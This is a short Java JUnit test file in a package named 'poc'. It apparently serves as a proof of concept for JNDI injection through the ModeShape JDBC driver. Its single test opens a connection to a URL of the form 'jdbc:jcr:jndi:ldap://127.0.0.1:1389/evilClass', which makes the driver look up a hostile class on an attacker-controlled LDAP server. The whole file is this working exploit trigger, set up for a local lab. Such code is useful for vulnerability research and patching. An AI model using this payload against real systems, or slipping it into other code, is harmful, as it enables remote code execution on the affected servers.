package com.trganda.poc;

import org.junit.jupiter.api.Test;

import java.sql.DriverManager;
import java.sql.SQLException;

public class Poc {
    @Test
    public void modeshape() throws SQLException {
        String url = "jdbc:jcr:jndi:ldap://127.0.0.1:1389/evilClass";
        DriverManager.getConnection(url);
    }
}
